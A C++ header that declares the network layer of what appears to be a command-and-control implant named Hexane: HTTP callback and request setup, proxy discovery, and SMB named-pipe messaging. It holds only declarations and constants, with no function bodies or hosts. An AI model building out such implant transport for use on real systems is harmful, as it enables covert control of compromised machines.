#ifndef HEXANE_CORELIB_NETWORK_HPP
#define HEXANE_CORELIB_NETWORK_HPP

#define INTERNET_OPEN_TYPE_PROXY                3
#define WINHTTP_FLAG_BYPASS_PROXY_CACHE     	0x00000100
#define WINHTTP_FLAG_SECURE                 	0x00800000
#include <core/corelib.hpp>

struct _request_context {
    HINTERNET conn_handle;
    HINTERNET req_handle;
    LPWSTR endpoint;
};

struct _proxy_context {
    WINHTTP_CURRENT_USER_IE_PROXY_CONFIG    proxy_config;
    WINHTTP_AUTOPROXY_OPTIONS               autoproxy;
    WINHTTP_PROXY_INFO                      proxy_info;
};

namespace Network {
    namespace Http {
        FUNCTION BOOL SetHeaders(HINTERNET *request);
        FUNCTION VOID HttpSendRequest(HINTERNET request, _stream **stream);
        FUNCTION VOID HttpCallback(_stream *out, _stream **in);
        FUNCTION _request_context* CreateRequestContext();
        FUNCTION _proxy_context* CreateProxyContext(_request_context *req_ctx);
    }

    namespace Smb {
        FUNCTION VOID SmbContextDestroy(PSMB_PIPE_SEC_ATTR SmbSecAttr);
        FUNCTION VOID SmbContextInit(SMB_PIPE_SEC_ATTR *SmbSecAttr, PSECURITY_ATTRIBUTES SecAttr);
        FUNCTION BOOL PipeRead(HANDLE handle, _stream *in);
        FUNCTION BOOL PipeWrite(HANDLE handle, _stream *out);
        FUNCTION BOOL PipeSend (_stream *out);
        FUNCTION BOOL PipeReceive(_stream **in);
    }
}
#endif //HEXANE_CORELIB_NETWORK_HPP
